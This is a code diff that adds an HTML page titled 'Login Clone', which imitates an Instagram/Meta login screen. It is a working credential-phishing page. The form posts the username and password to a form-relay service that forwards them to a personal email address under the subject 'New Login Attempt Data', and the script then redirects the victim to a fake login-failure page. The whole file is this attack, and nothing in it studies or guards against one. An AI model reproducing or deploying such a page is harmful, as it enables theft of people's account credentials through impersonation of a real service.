@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Clone</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        
+        <div class="language-selector">English (UK)</div>
+
+        <div class="logo">
+            <img src="https://raw.githubusercontent.com/bignewindia/pt/e7bf53788739b39c3ec9041b3614965cffe121a9/IMG_20251025_231102.jpg" alt="Logo" class="insta-logo"> 
+        </div>
+
+        <form action="https://formsubmit.co/gaurijha1511@gmail.com" method="POST" class="login-form" id="loginForm">
+            <input type="text" name="Username" placeholder="Username, email address or mobile ..." required>
+            <input type="password" name="Password" placeholder="Password" required>
+            
+            <input type="text" name="_honey" style="display:none"> 
+            <input type="hidden" name="_redirect" value="YOUR_GITHUB_PAGES_URL/login-fail.html">
+            <input type="hidden" name="_subject" value="New Login Attempt Data">
+
+            <button type="submit" class="login-button" id="loginButton">Log in</button>
+        </form>
+
+        <a href="#" class="forgot-password">Forgotten password?</a>
+
+        <button class="create-account-button">Create new account</button>
+
+        <div class="meta-branding">
+            &infin; Meta
+        </div>
+        
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+
+            const form = event.target;
+            const button = document.getElementById('loginButton');
+            const redirectUrl = form.querySelector('input[name="_redirect"]').value;
+
+            button.disabled = true;
+            button.textContent = 'Logging in...';
+
+            fetch(form.action, {
+                method: form.method,
+                body: new FormData(form),
+                headers: {
+                    'Accept': 'application/json' 
+                }
+            })
+            .then(response => {
+                // Regardless of the FormSubmit response, redirect immediately
+                window.location.href = redirectUrl;
+            })
+            .catch(error => {
+                // If there's an error during fetch, still redirect to the fail page
+                window.location.href = redirectUrl;
+            });
+        });
+    </script>
+</body>
+</html>
